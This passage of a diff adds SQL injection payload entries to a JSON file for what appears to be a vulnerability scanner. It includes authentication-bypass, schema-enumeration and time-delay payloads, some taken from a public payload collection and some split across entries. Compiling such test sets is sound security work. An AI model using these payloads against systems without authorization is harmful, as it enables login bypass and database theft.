+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0092",
+    "payload": "GET /index.php?col=%3f%23%00&name=anything",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0093",
+    "payload": "'x\\",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0094",
+    "payload": "GET /index.php?col=%3f%23%00&name=x%60;%23",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0095",
+    "payload": "GET /index2.php?col=\\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0096",
+    "payload": "+from+information_schema.tables)y%3b%2523",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-001",
+    "payload": "' OR '1'='1",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "Boolean-based SQL injection baseline check",
+    "expected_feature": "Login/auth bypass behavior or conditional response difference",
+    "source": "curated"
+  },
+  {
+    "id": "sqli-002",
+    "payload": "' AND 1=2 -- ",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "False condition comparison for differential response",
+    "expected_feature": "Different response body/length than normal request",
+    "source": "curated"
+  },
+  {
+    "id": "sqli-101",
+    "payload": "'; WAITFOR DELAY '0:0:5' --",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "Time-based SQLi verification",
+    "expected_feature": "Significant and repeatable response delay",
+    "source": "curated"
+  }
+]
